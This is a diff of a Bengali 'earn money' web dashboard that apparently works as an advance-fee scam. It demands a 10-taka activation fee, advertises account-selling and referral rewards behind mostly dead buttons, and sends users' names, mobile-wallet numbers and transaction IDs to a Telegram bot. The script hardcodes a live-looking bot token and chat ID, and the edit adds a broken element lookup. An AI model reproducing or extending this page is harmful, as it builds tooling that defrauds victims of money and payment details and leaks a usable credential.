@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
@@ -26,14 +26,14 @@
     <div class="max-w-md mx-auto p-4 space-y-4">
 
         <!-- Inactive Account Alert Card -->
-        <div id="inactiveAlertCard" class="bg-red-50 border border-red-200 p-4 rounded-3xl shadow-sm flex items-center justify-between">
+        <div class="bg-red-50 border border-red-200 p-4 rounded-3xl shadow-sm flex items-center justify-between">
             <div class="flex items-center space-x-3">
                 <div class="text-amber-500 text-2xl">
                     <i class="fa-solid fa-triangle-exclamation"></i>
                 </div>
                 <div>
                     <h4 class="font-bold text-red-600 text-sm">আপনার একাউন্ট ইনএক্টিভ!</h4>
-                    <p class="text-xs text-gray-500 mt-0.5">কাজ করতে ১০ টাকা দিয়ে একটিভ করুন।</p>
+                    <p class="text-xs text-gray-500 mt-0.5">কাজ করতে ১০ টাকা দিয়ে একটিভ করুন।</p>
                 </div>
             </div>
             <button onclick="openActivationModal()" class="bg-gradient-to-r from-orange-500 to-red-500 text-white font-bold px-3 py-2 rounded-xl text-xs shadow-md shadow-orange-200 flex items-center gap-1 hover:scale-105 transition">
@@ -41,7 +41,7 @@
             </button>
         </div>
 
-        <!-- User Balance Card (15 BDT Bonus Included) -->
+        <!-- User Balance Card -->
         <div class="bg-gradient-to-r from-teal-500 via-indigo-600 to-purple-700 text-white p-5 rounded-3xl shadow-xl flex justify-between items-center">
             <div class="flex items-center space-x-3">
                 <div class="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center border border-white/30">
@@ -50,14 +50,14 @@
                 <div>
                     <p class="text-[10px] tracking-wider uppercase opacity-80 font-bold">WELCOME BACK ✋</p>
                     <h2 class="text-lg font-black tracking-wide" id="userNameDisplay">MD JAHID</h2>
-                    <span id="badgeStatus" class="bg-red-500/80 text-[10px] px-2 py-0.5 rounded-full font-bold flex items-center gap-1 w-fit mt-1">
-                        <i class="fa-solid fa-circle text-[6px]"></i> <span id="statusText">Inactive</span>
+                    <span class="bg-red-500/80 text-[10px] px-2 py-0.5 rounded-full font-bold flex items-center gap-1 w-fit mt-1">
+                        <i class="fa-solid fa-circle text-[6px]"></i> Inactive
                     </span>
                 </div>
             </div>
             <div class="bg-white/10 backdrop-blur-md p-3 rounded-2xl border border-white/20 text-right">
                 <p class="text-[10px] opacity-80 uppercase font-bold">MAIN BALANCE</p>
-                <h1 class="text-2xl font-black mt-0.5" id="mainBalanceDisplay">৳15.00</h1>
+                <h1 class="text-2xl font-black mt-0.5">৳0.00</h1>
             </div>
         </div>
 
@@ -67,7 +67,7 @@
                 <div class="flex items-center space-x-2">
                     <i class="fa-solid fa-gift text-2xl text-yellow-200"></i>
                     <div>
-                        <h4 class="font-extrabold text-sm">রেফার করুন ও আয় করুন!</h4>
+                        <h4 class="font-extrabold text-sm">রেফার করুন ও আয় করুন!</h4>
                         <p class="text-[11px] text-amber-100">প্রতি সফল রেফারে পাবেন <b>১৫ টাকা</b> 💸</p>
                     </div>
                 </div>
@@ -83,77 +83,80 @@
         <!-- Section Title -->
         <div class="flex justify-between items-center pt-1">
             <h3 class="font-bold text-gray-800 text-sm flex items-center gap-2">
-                <i class="fa-solid fa-rocket text-purple-600"></i> আমাদের প্রিমিয়াম প্রজেক্ট
+                <i class="fa-solid fa-rocket text-purple-600"></i> আমাদের প্রিমিয়াম প্রজেক্ট
             </h3>
         </div>
 
         <!-- 16 Grid Items Section -->
         <div class="grid grid-cols-4 gap-3 bg-white p-4 rounded-3xl shadow-sm border border-purple-50">
             
-            <a href="#" onclick="checkTaskAccess('ফেসবুক সেল')" class="flex flex-col items-center text-center">
+            <!-- Row 1 -->
+            <a href="#" onclick="alert('ফেসবুক সেল সার্ভিস শীঘ্রই চালু হবে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-blue-600 text-white rounded-2xl flex items-center justify-center text-2xl shadow-sm">
                     <i class="fa-brands fa-facebook-f"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">ফেসবুক সেল</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('জিমেইল সেল')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('জিমেইল সেল সার্ভিস শীঘ্রই চালু হবে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-red-500 text-white rounded-2xl flex items-center justify-center text-2xl shadow-sm">
                     <i class="fa-solid fa-envelope"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">জিমেইল সেল</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('ইনস্টা সেল')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('ইনস্টা সেল সার্ভিস শীঘ্রই চালু হবে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-gradient-to-tr from-amber-500 via-rose-500 to-purple-600 text-white rounded-2xl flex items-center justify-center text-2xl shadow-sm">
                     <i class="fa-brands fa-instagram"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">ইনস্টা সেল</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('কয়েন সেল')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('কয়েন সেল সার্ভিস শীঘ্রই চালু হবে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-emerald-500 text-white rounded-2xl flex items-center justify-center text-2xl shadow-sm">
                     <i class="fa-solid fa-coins"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">কয়েন সেল</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('Micro Job')" class="flex flex-col items-center text-center">
+            <!-- Row 2 -->
+            <a href="#" onclick="alert('Micro Job শীঘ্রই আসছে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-pink-500 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-briefcase"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">Micro Job</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('প্রিমিয়াম জব')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('প্রিমিয়াম জব শীঘ্রই আসছে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-amber-500 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-crown"></i>
                 </div>
-                <span class="text-[11px] font-bold text-gray-700 mt-1.5">প্রিমিয়াম জব</span>
+                <span class="text-[11px] font-bold text-gray-700 mt-1.5">প্রিমিয়াম জব</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('ভিডিওর কাজ')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('ভিডিওর কাজ শীঘ্রই আসছে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-red-600 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-circle-play"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">ভিডিওর কাজ</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('VIP প্ল্যান')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('VIP প্ল্যান শীঘ্রই আসবে!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-indigo-600 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-gem"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">VIP প্ল্যান</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('জব হিস্ট্রি')" class="flex flex-col items-center text-center">
+            <!-- Row 3 -->
+            <a href="#" onclick="alert('জব হিস্ট্রি ফাঁকা আছে।')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-sky-500 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-file-lines"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">জব হিস্ট্রি</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('রেফার হিস্ট্রি')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="openTeamModal(); return false;" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-orange-500 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-user-clock"></i>
                 </div>
@@ -167,13 +170,14 @@
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">উইথড্র হিস্ট্রি</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('My Team')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="openTeamModal(); return false;" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-blue-500 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-users"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">My Team</span>
             </a>
 
+            <!-- Row 4 -->
             <a href="#" onclick="openWalletModal(); return false;" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-amber-600 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-wallet"></i>
@@ -181,20 +185,21 @@
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">Withdraw</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('গিফট কোড')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('আপনার কোনো গিফ্ট কোড নেই!')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-yellow-500 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-box-open"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">গিফট কোড</span>
             </a>
 
-            <a href="#" onclick="checkTaskAccess('লিডারবোর্ড')" class="flex flex-col items-center text-center">
+            <a href="#" onclick="alert('লিডারবোর্ড চেক করা হচ্ছে...')" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-purple-600 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-trophy"></i>
                 </div>
                 <span class="text-[11px] font-bold text-gray-700 mt-1.5">লিডারবোর্ড</span>
             </a>
 
+            <!-- Support Link -->
             <a href="https://t.me/OWNER_TANJIR_VAI" target="_blank" class="flex flex-col items-center text-center">
                 <div class="w-12 h-12 bg-sky-600 text-white rounded-2xl flex items-center justify-center text-xl shadow-sm">
                     <i class="fa-solid fa-headset"></i>
@@ -243,7 +248,7 @@
         </div>
     </div>
 
-    <!-- Wallet Modal (Min Withdrawal 100 BDT) -->
+    <!-- Wallet Modal -->
     <div id="walletModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
         <div class="bg-white rounded-3xl p-6 w-full max-w-sm shadow-2xl relative border border-purple-100">
             <button onclick="closeModal('walletModal')" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
@@ -253,13 +258,13 @@
                 <div class="w-12 h-12 bg-teal-100 text-teal-600 rounded-full flex items-center justify-center mx-auto mb-2">
                     <i class="fa-solid fa-wallet text-xl"></i>
                 </div>
-                <h3 class="text-lg font-bold text-gray-800">মাই ওয়ালেট (Withdraw)</h3>
-                <p class="text-xs text-red-500 font-semibold mt-0.5">⚠️ সর্বনিম্ন উইথড্র ১০০ টাকা</p>
+                <h3 class="text-lg font-bold text-gray-800">মাই ওয়ালেট (Withdraw)</h3>
+                <p class="text-xs text-gray-500 mt-0.5">সর্বনিম্ন উইথড্র ১০০ টাকা</p>
             </div>
             
             <div class="bg-gradient-to-r from-teal-500 to-emerald-600 p-4 rounded-2xl text-white text-center mb-4 shadow-md">
                 <p class="text-[10px] uppercase font-bold tracking-wider opacity-80">বর্তমান ব্যালেন্স</p>
-                <h2 class="text-2xl font-black mt-0.5" id="modalBalanceDisplay">৳15.00</h2>
+                <h2 class="text-2xl font-black mt-0.5">৳0.00</h2>
             </div>
 
             <form onsubmit="handleWithdrawSubmit(event)" class="space-y-3">
@@ -276,12 +281,47 @@
                 </div>
                 <div>
                     <label class="block text-xs font-bold text-gray-700 mb-1">টাকার পরিমাণ (টাকা)</label>
-                    <input type="number" id="withdrawAmount" placeholder="সর্বনিম্ন ১০০ টাকা" required class="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-xs focus:outline-none focus:border-purple-600">
+                    <input type="number" id="withdrawAmount" placeholder="সর্বনিম্ন ১০০ টাকা" min="100" required class="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-xs focus:outline-none focus:border-purple-600">
                 </div>
                 <button type="submit" id="withdrawBtn" class="w-full bg-gradient-to-r from-teal-600 to-emerald-600 hover:from-teal-700 hover:to-emerald-700 text-white font-bold py-3 rounded-xl text-xs shadow-lg shadow-teal-100 mt-2">
                     উইথড্র রিকোয়েস্ট পাঠান
                 </button>
             </form>
+        </div>
+    </div>
+
+    <!-- Team Modal -->
+    <div id="teamModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-3xl p-6 w-full max-w-sm shadow-2xl relative border border-purple-100">
+            <button onclick="closeModal('teamModal')" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <div class="text-center mb-4">
+                <div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-2">
+                    <i class="fa-solid fa-users text-xl"></i>
+                </div>
+                <h3 class="text-lg font-bold text-gray-800">মাই টিম (My Team)</h3>
+                <p class="text-xs text-gray-500">আপনার রেফারেল নেটওয়ার্ক</p>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 mb-4">
+                <div class="bg-blue-50 border border-blue-100 p-3 rounded-2xl text-center">
+                    <p class="text-[10px] text-gray-500 font-bold uppercase">মোট রেফার</p>
+                    <h4 class="text-xl font-black text-blue-600 mt-0.5">0 জন</h4>
+                </div>
+                <div class="bg-emerald-50 border border-emerald-100 p-3 rounded-2xl text-center">
+                    <p class="text-[10px] text-gray-500 font-bold uppercase">রেফার বোনাস</p>
+                    <h4 class="text-xl font-black text-emerald-600 mt-0.5">৳0.00</h4>
+                </div>
+            </div>
+
+            <div class="bg-gray-50 border border-gray-200 rounded-2xl p-4 text-center">
+                <i class="fa-solid fa-user-plus text-3xl text-gray-300 mb-2"></i>
+                <p class="text-xs text-gray-500 font-semibold">আপনার টিমে এখনও কেউ যুক্ত হয়নি।</p>
+                <button onclick="closeModal('teamModal'); copyReferLink();" class="mt-3 bg-blue-600 text-white font-bold px-4 py-2 rounded-xl text-xs shadow-md hover:bg-blue-700 transition">
+                    রেফার লিঙ্ক কপি করুন
+                </button>
+            </div>
         </div>
     </div>
 
@@ -296,7 +336,7 @@
                     <i class="fa-solid fa-user text-2xl"></i>
                 </div>
                 <h3 class="text-lg font-bold text-gray-800" id="profileNameDisplay">MD JAHID</h3>
-                <span id="profileStatusBadge" class="bg-red-100 text-red-600 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-1">Inactive User</span>
+                <span class="bg-red-100 text-red-600 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-1">Inactive User</span>
             </div>
 
             <div class="space-y-2 text-xs text-gray-700 border-t border-b border-gray-100 py-3 mb-4">
@@ -318,13 +358,17 @@
                 </div>
             </div>
 
+            <button onclick="alert('পাসওয়ার্ড পরিবর্তনের সুবিধা শীঘ্রই চালু হবে।')" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-2.5 rounded-xl text-xs border border-gray-200 transition mb-2">
+                <i class="fa-solid fa-key text-gray-400 mr-1"></i> পাসওয়ার্ড পরিবর্তন
+            </button>
+
             <a href="index.html" class="block text-center w-full bg-red-50 hover:bg-red-100 text-red-600 font-bold py-2.5 rounded-xl text-xs border border-red-200 transition">
                 <i class="fa-solid fa-right-from-bracket mr-1"></i> লগ আউট করুন
             </a>
         </div>
     </div>
 
-    <!-- Bottom Navigation Bar -->
+    <!-- Bottom Navigation Bar (Fixed with proper button triggers) -->
     <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-2 px-6 flex justify-between items-center z-40 max-w-md mx-auto">
         <a href="https://t.me/OWNER_TANJIR_VAI" target="_blank" class="flex flex-col items-center text-gray-400 hover:text-indigo-600 cursor-pointer">
             <i class="fa-solid fa-headset text-lg"></i>
@@ -340,7 +384,7 @@
             </div>
             <span class="text-[10px] font-bold text-indigo-700 mt-0.5">HOME</span>
         </div>
-        <button onclick="checkTaskAccess('Team')" class="flex flex-col items-center text-gray-400 hover:text-indigo-600 cursor-pointer bg-transparent border-0 focus:outline-none">
+        <button onclick="openTeamModal()" class="flex flex-col items-center text-gray-400 hover:text-indigo-600 cursor-pointer bg-transparent border-0 focus:outline-none">
             <i class="fa-solid fa-users text-lg"></i>
             <span class="text-[10px] font-semibold mt-0.5">Team</span>
         </button>
@@ -355,31 +399,16 @@
         const BOT_TOKEN = '8726008499:AAFIajdSOavCs8lB8Yh2IlODwEqsmyr9-2c';
         const CHAT_ID = '6733473116';
 
-        // একাউন্ট খোলার সাথে সাথেই ১৫ টাকা বোনাস এবং ইনঅ্যাক্টিভ স্টেট
-        let isAccountActive = false;
-        let userBalance = 15.00;
-
-        function updateBalanceUI() {
-            document.getElementById('mainBalanceDisplay').innerText = '৳' + userBalance.toFixed(2);
-            document.getElementById('modalBalanceDisplay').innerText = '৳' + userBalance.toFixed(2);
-        }
-        updateBalanceUI();
-
-        function checkTaskAccess(taskName) {
-            if (!isAccountActive) {
-                alert('⚠️ আপনার অ্যাকাউন্টটি ইনঅ্যাক্টিভ! কাজ করতে ১০ টাকা দিয়ে আগে অ্যাকাউন্টটি একটিভ করুন।');
-                openActivationModal();
-                return;
-            }
-            alert(taskName + ' সেকশনে আপনাকে স্বাগতম!');
-        }
-
         function openActivationModal() {
             document.getElementById('activationModal').classList.remove('hidden');
         }
 
         function openWalletModal() {
             document.getElementById('walletModal').classList.remove('hidden');
+        }
+
+        function openTeamModal() {
+            document.getElementById('teamModal').classList.remove('hidden');
         }
 
         function openProfileModal() {
@@ -391,11 +420,6 @@
         }
 
         function copyReferLink() {
-            if (!isAccountActive) {
-                alert('⚠️ অ্যাকাউন্ট একটিভ ছাড়া আপনি রেফার লিঙ্ক শেয়ার করতে পারবেন না!');
-                openActivationModal();
-                return;
-            }
             const copyText = document.getElementById("referLinkInput");
             copyText.select();
             copyText.setSelectionRange(0, 99999);
@@ -414,7 +438,8 @@
             submitBtn.innerText = 'জমা হচ্ছে...';
             submitBtn.disabled = true;
 
-            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
 
             fetch(url)
@@ -425,22 +450,14 @@
                             document.getElementById('userNameDisplay').innerText = name.toUpperCase();
                             document.getElementById('profileNameDisplay').innerText = name.toUpperCase();
                         }
-                        
-                        isAccountActive = true;
-                        document.getElementById('statusText').innerText = 'Active';
-                        document.getElementById('badgeStatus').className = "bg-green-500/80 text-[10px] px-2 py-0.5 rounded-full font-bold flex items-center gap-1 w-fit mt-1";
-                        document.getElementById('profileStatusBadge').className = "bg-green-100 text-green-600 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-1";
-                        document.getElementById('profileStatusBadge').innerText = "Active User";
-                        document.getElementById('inactiveAlertCard').style.display = 'none';
-
-                        alert('আপনার তথ্য সফলভাবে জমা হয়েছে! অ্যাকাউন্ট সফলভাবে একটিভ করা হয়েছে।');
+                        alert('আপনার তথ্য সফলভাবে জমা হয়েছে! ১০-১৫ মিনিটের মধ্যে একাউন্ট একটিভ করা হবে।');
                         closeModal('activationModal');
                     } else {
-                        alert('তথ্য পাঠাতে সমস্যা হয়েছে, আবার চেষ্টা করুন।');
+                        alert('তথ্য পাঠাতে সমস্যা হয়েছে, আবার চেষ্টা করুন।');
                     }
                 })
                 .catch(error => {
-                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
+                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
                 })
                 .finally(() => {
                     submitBtn.innerText = 'তথ্য জমা দিন';
@@ -448,53 +465,32 @@
                 });
         }
 
-        // ১০০ টাকার নিচে উইথড্র না হওয়ার চেক সিস্টেম
         function handleWithdrawSubmit(event) {
             event.preventDefault();
-            
-            if (!isAccountActive) {
-                alert('⚠️ অ্যাকাউন্ট একটিভ ছাড়া উইথড্র করা যাবে না!');
-                openActivationModal();
-                return;
-            }
-
             const method = document.getElementById('withdrawMethod').value;
-            const phone = document.getElementById('withdrawPhone').value;
-            const amount = parseFloat(document.getElementById('withdrawAmount').value);
+            const phone = document.getElementById('withdrawPhone.value') || document.getElementById('withdrawPhone').value;
+            const amount = document.getElementById('withdrawAmount').value;
             const withdrawBtn = document.getElementById('withdrawBtn');
-
-            // সর্বনিম্ন ১০০ টাকা চেকিং লজিক
-            if (isNaN(amount) || amount < 100) {
-                alert('❌ সর্বনিম্ন ১০০ টাকা বা তার বেশি হলে তবেই উইথড্র করতে পারবেন!');
-                return;
-            }
-
-            if (amount > userBalance) {
-                alert('❌ আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই!');
-                return;
-            }
 
             withdrawBtn.innerText = 'পাঠানো হচ্ছে...';
             withdrawBtn.disabled = true;
 
-            const message = `💸 *নতুন উইথড্র রিকোয়েস্ট!* %0A%0A📱 *মেথড:* ${method}%0A📞 *নম্বর:* ${phone}%0A💰 *পরিমাণ:* ${amount} টাকা%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+            const message = `💸 *নতুন উইথড্র রিকোয়েস্ট!* %0A%0A📱 *মেথড:* ${method}%0A📞 *নম্বর:* ${phone}%0A💰 *পরিমাণ:* ${amount} টাকা%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        userBalance -= amount;
-                        updateBalanceUI();
-
-                        alert('আপনার উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে! শীঘ্রই পেমেন্ট দেওয়া হবে।');
+                        alert('আপনার উইথড্র রিকোয়েস্ট জমা হয়েছে! শীঘ্রই পেমেন্ট করা হবে।');
                         closeModal('walletModal');
                     } else {
-                        alert('উইথড্র রিকোয়েস্ট পাঠাতে সমস্যা হয়েছে।');
+                        alert('উইথড্র রিকোয়েস্ট পাঠাতে সমস্যা হয়েছে।');
                     }
                 })
                 .catch(error => {
-                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
+                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
                 })
                 .finally(() => {
                     withdrawBtn.innerText = 'উইথড্র রিকোয়েস্ট পাঠান';
